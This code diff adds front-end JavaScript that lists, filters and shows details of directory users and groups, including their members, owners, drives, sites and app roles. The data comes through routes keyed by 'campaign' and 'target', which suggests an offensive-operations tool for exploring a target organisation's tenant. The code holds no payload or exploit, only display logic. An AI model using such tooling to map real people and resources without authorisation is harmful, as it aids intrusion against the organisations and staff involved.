+      <td style="color:var(--text-dim);font-size:11px">${escH(u.jobTitle||'—')}</td>
+      <td style="color:var(--text-dim);font-size:11px">${escH(u.department||'—')}</td>
+      <td><button class="btn btn-sm" onclick="usersShowDetail('${escH(u.id||u.userPrincipalName)}')">→</button></td>
+    </tr>`).join('') + '</tbody></table>';
+  renderPager('usersPager', page, totalPages, total, 'usersPrevPage', 'usersNextPage');
+}
+function usersPrevPage() { usersState.page--; usersRenderTable(); }
+function usersNextPage() { usersState.page++; usersRenderTable(); }
+
+async function usersShowDetail(userId) {
+  const tid = usersGetTarget();
+  if (!tid) return;
+  document.getElementById('userDetailPanel').style.display = '';
+  document.getElementById('userDetailPanel').innerHTML = '<div style="padding:16px;color:var(--text-dim)">⏳ Loading user details...</div>';
+  document.getElementById('groupDetailPanel').style.display = 'none';
+  const [ur, mr] = await Promise.all([
+    apiFetch('/campaigns/' + activeCampaignID + '/graph/' + encodeURIComponent(tid) + '/users/' + encodeURIComponent(userId)),
+    apiFetch('/campaigns/' + activeCampaignID + '/graph/' + encodeURIComponent(tid) + '/users/' + encodeURIComponent(userId) + '/member-of')
+  ]);
+  const user = ur ? await ur.json() : {};
+  const memberOf = mr ? (await mr.json()) : {};
+  document.getElementById('userDetailPanel').innerHTML = renderUserDetail(user, memberOf.value||[]);
+}
+
+function renderUserDetail(u, memberOf) {
+  const fields = [
+    ['Display Name', u.displayName], ['UPN', u.userPrincipalName], ['Email', u.mail],
+    ['Job Title', u.jobTitle], ['Department', u.department], ['Office', u.officeLocation],
+    ['Mobile', u.mobilePhone], ['Account Enabled', u.accountEnabled ? 'Yes' : 'No'],
+    ['Created', u.createdDateTime ? new Date(u.createdDateTime).toLocaleString() : '—'],
+    ['Last PW Change', u.lastPasswordChangeDateTime ? new Date(u.lastPasswordChangeDateTime).toLocaleString() : '—'],
+    ['Usage Location', u.usageLocation]
+  ].filter(([,v])=>v!=null && v!==undefined);
+
+  const kvRows = fields.map(([k,v]) => `<div class="kv-key">${escH(k)}</div><div class="kv-val">${escH(String(v))}</div>`).join('');
+  const groupRows = memberOf.map(g =>
+    `<div style="padding:4px 0;font-size:11px;color:var(--text);border-bottom:1px solid var(--border)">
+      <span style="color:var(--accent)">${escH(g.displayName||'—')}</span>
+      <span style="color:var(--text-dim);margin-left:8px;font-size:10px">${escH((g.groupTypes||[]).join(', ')||g['@odata.type']||'')}</span>
+    </div>`).join('') || '<div style="color:var(--text-dim);font-size:11px">No group memberships</div>';
+
+  return `<div class="detail-panel-header">
+    <span class="detail-panel-title">👤 ${escH(u.displayName||u.userPrincipalName||'User')}</span>
+    <button class="btn btn-sm" onclick="document.getElementById('userDetailPanel').style.display='none'">✕</button>
+  </div>
+  <div style="display:grid;grid-template-columns:1fr 1fr;gap:16px;padding:14px">
+    <div>
+      <div style="font-size:10px;color:var(--text-dim);letter-spacing:0.15em;text-transform:uppercase;margin-bottom:8px">Profile</div>
+      <div class="kv-grid">${kvRows}</div>
+    </div>
+    <div>
+      <div style="font-size:10px;color:var(--text-dim);letter-spacing:0.15em;text-transform:uppercase;margin-bottom:8px">Group Memberships (${memberOf.length})</div>
+      ${groupRows}
+    </div>
+  </div>`;
+}
+
+function groupsApplyFilter() {
+  const q = document.getElementById('groupsFilter').value.toLowerCase();
+  if (!q) { usersState.groupsFiltered = usersState.groupsAll.slice(); }
+  else {
+    const typeOf = g => {
+      const t = g.groupTypes||[];
+      return t.includes('Unified') ? 'm365' : (g.securityEnabled ? 'security' : 'mail');
+    };
+    const fieldMap = {
+      displayName: g => g.displayName||'',
+      description: g => g.description||'',
+      mail: g => g.mail||'',
+      groupType: g => typeOf(g),
+      id: g => g.id||'',
+    };
+    usersState.groupsFiltered = usersState.groupsAll.filter(g =>
+      [...groupsFilterFields].some(f => fieldMap[f] && fieldMap[f](g).toLowerCase().includes(q))
+    );
+  }
+  usersState.groupsPage = 1;
+  groupsRenderTable();
+}
+
+function groupsRenderTable() {
+  const { items, page, totalPages, total } = paginate(usersState.groupsFiltered, usersState.groupsPage);
+  document.getElementById('groupsCount').textContent = total + ' groups';
+  const el = document.getElementById('groupsTableWrap');
+  if (!items.length) { el.innerHTML = '<div style="padding:16px;text-align:center;color:var(--text-dim)">No groups</div>'; document.getElementById('groupsPager').innerHTML=''; return; }
+  el.innerHTML = `<table class="data-table"><thead><tr><th>Name</th><th>Type</th><th>Mail</th><th></th></tr></thead><tbody>` +
+    items.map(g => {
+      const typeArr = g.groupTypes||[];
+      const gtype = typeArr.includes('Unified') ? 'M365' : (g.securityEnabled ? 'Security' : 'Mail');
+      return `<tr>
+        <td style="color:var(--text-bright);cursor:pointer" onclick="groupsShowDetail('${escH(g.id)}')">${escH(g.displayName||'—')}</td>
+        <td><span style="font-size:10px;color:var(--accent)">${gtype}</span></td>
+        <td style="color:var(--text-dim);font-size:11px">${escH(g.mail||'—')}</td>
+        <td><button class="btn btn-sm" onclick="groupsShowDetail('${escH(g.id)}')">→</button></td>
+      </tr>`;
+    }).join('') + '</tbody></table>';
+  renderPager('groupsPager', page, totalPages, total, 'groupsPrevPage', 'groupsNextPage');
+}
+function groupsPrevPage() { usersState.groupsPage--; groupsRenderTable(); }
+function groupsNextPage() { usersState.groupsPage++; groupsRenderTable(); }
+
+const groupDetailState = { id: '', tab: 'overview', cache: {} };
+
+async function groupsShowDetail(groupId) {
+  groupDetailState.id = groupId;
+  groupDetailState.cache = {};
+  document.getElementById('groupDetailPanel').style.display = '';
+  document.getElementById('userDetailPanel').style.display = 'none';
+  await groupsLoadTab('overview');
+}
+
+async function groupsLoadTab(tab) {
+  groupDetailState.tab = tab;
+  const panel = document.getElementById('groupDetailPanel');
+  const tid = usersGetTarget();
+  if (!tid) return;
+
+  const tabBar = ['overview','members','owners','member-of','drives','sites','app-roles'].map(t =>
+    `<button class="detail-tab${groupDetailState.tab===t?' active':''}" onclick="groupsLoadTab('${t}')">${t}</button>`
+  ).join('');
+
+  panel.innerHTML = `<div class="detail-panel-header">
+    <span class="detail-panel-title">🏢 Group</span>
+    <button class="btn btn-sm" onclick="document.getElementById('groupDetailPanel').style.display='none'">✕</button>
+  </div>
+  <div class="detail-tabs">${tabBar}</div>
+  <div class="detail-body" id="groupDetailBody"><span style="color:var(--text-dim)">⏳ Loading...</span></div>`;
+
+  const gid = groupDetailState.id;
+  const pathMap = {
+    'overview': `/groups/${encodeURIComponent(gid)}`,
+    'members': `/groups/${encodeURIComponent(gid)}/transitive-members`,
+    'owners': `/groups/${encodeURIComponent(gid)}/owners`,
+    'member-of': `/groups/${encodeURIComponent(gid)}/member-of`,
+    'drives': `/groups/${encodeURIComponent(gid)}/drives`,
+    'sites': `/groups/${encodeURIComponent(gid)}/sites`,
+    'app-roles': `/groups/${encodeURIComponent(gid)}/app-roles`
+  };
+
+  const suffix = pathMap[tab] || '';
+  if (!suffix) return;
+
+  if (groupDetailState.cache[tab]) {
+    renderGroupTabContent(tab, groupDetailState.cache[tab]);
+    return;
+  }
+
+  const r = await apiFetch('/campaigns/' + activeCampaignID + '/graph/' + encodeURIComponent(tid) + suffix);
+  if (!r) return;
+  const data = await r.json();
+  groupDetailState.cache[tab] = data;
+  renderGroupTabContent(tab, data);
+}
+
+function renderGroupTabContent(tab, data) {
+  const el = document.getElementById('groupDetailBody');
+  if (!el) return;
+  if (data.error) { el.innerHTML = `<div style="color:var(--accent2)">${escH(data.error)}</div>`; return; }
+
+  if (tab === 'overview') {
+    const fields = [
+      ['ID', data.id], ['Display Name', data.displayName], ['Description', data.description],
+      ['Mail', data.mail], ['Type', (data.groupTypes||[]).join(', ')||'Security'],
+      ['Security Enabled', data.securityEnabled?'Yes':'No'], ['Mail Enabled', data.mailEnabled?'Yes':'No'],
+      ['Visibility', data.visibility], ['Created', data.createdDateTime ? new Date(data.createdDateTime).toLocaleString() : '—']
+    ].filter(([,v])=>v!=null&&v!==undefined);
+    el.innerHTML = `<div class="kv-grid">${fields.map(([k,v])=>`<div class="kv-key">${escH(k)}</div><div class="kv-val">${escH(String(v))}</div>`).join('')}</div>`;
+    return;
+  }
+
+  const items = data.value || [];
+  if (!items.length) { el.innerHTML = '<div style="color:var(--text-dim);font-size:11px;padding:8px 0">No data</div>'; return; }
+
+  // Render based on tab type
+  if (tab === 'members' || tab === 'owners') {
+    el.innerHTML = `<table class="data-table"><thead><tr><th>Name</th><th>Email</th><th>Title</th></tr></thead><tbody>` +
+      items.map(u=>`<tr>
+        <td style="color:var(--text-bright)">${escH(u.displayName||'—')}</td>
+        <td style="color:var(--accent);font-size:11px">${escH(u.mail||u.userPrincipalName||'—')}</td>
+        <td style="color:var(--text-dim);font-size:11px">${escH(u.jobTitle||'—')}</td>
+      </tr>`).join('') + `</tbody></table><div style="color:var(--text-dim);font-size:10px;margin-top:4px">${items.length} records</div>`;
+    return;
+  }
+
+  if (tab === 'drives' || tab === 'sites') {
+    el.innerHTML = `<table class="data-table"><thead><tr><th>Name</th><th>URL</th></tr></thead><tbody>` +
+      items.map(d=>`<tr>
+        <td style="color:var(--text-bright)">${escH(d.name||d.displayName||'—')}</td>
+        <td>${d.webUrl?`<a href="${escH(d.webUrl)}" target="_blank" style="color:var(--accent);font-size:11px">${escH(truncate(d.webUrl,60))}</a>`:'—'}</td>
+      </tr>`).join('') + '</tbody></table>';
+    return;
+  }
+
+  // Generic for member-of, app-roles
+  el.innerHTML = `<table class="data-table"><thead><tr><th>Name</th><th>Type</th></tr></thead><tbody>` +
+    items.map(i=>`<tr>
+      <td style="color:var(--text-bright)">${escH(i.displayName||i.principalDisplayName||'—')}</td>
+      <td style="color:var(--text-dim);font-size:11px">${escH(i['@odata.type']||(i.groupTypes||[]).join(',')||'—')}</td>
+    </tr>`).join('') + `</tbody></table><div style="color:var(--text-dim);font-size:10px;margin-top:4px">${items.length} records</div>`;
+}
 </script>
 </body>
 </html>
